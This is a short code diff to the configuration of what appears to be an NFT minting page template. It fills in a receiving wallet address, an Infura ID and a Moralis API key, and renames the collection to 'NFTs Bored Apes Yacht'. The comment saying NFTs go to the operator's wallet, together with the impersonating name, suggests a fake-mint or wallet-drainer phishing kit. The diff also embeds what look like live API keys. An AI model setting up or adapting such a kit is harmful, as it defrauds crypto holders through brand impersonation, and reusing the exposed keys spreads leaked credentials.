@@ -1,11 +1,11 @@
-const address = "YOUR WALLET";    // Your wallet that you have to receive NFTs
-const infuraId = "API KEY"     // Infuria ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "X-API-KEY"    // x-api-key | https://moralis.io/ | For NFTs
+const address = "0xcDE951Ff5e05DF29324d7B45CFb492AAF248De1F";    // Your wallet that you have to receive NFTs
+const infuraId = "a981ad538c8d463ea4dd2c7cf228fd0d"     // Infuria ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "sjCBBvR8BeizMHz7sxMLQhzt4X0xde0j9cVq7o7KN45IOS9tz7mS4uAYbg93sXrG"    // x-api-key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "NFTs Montana",
-    title: "NftMontana MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "25.04.2022",
+    name: "NFTs Bored Apes Yacht",
+    title: "NftBayc MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "25.08.2022",
     socialMedia: {
         discord: "https://discord.gg/example",
         twitter: "https://twitter.com/example",
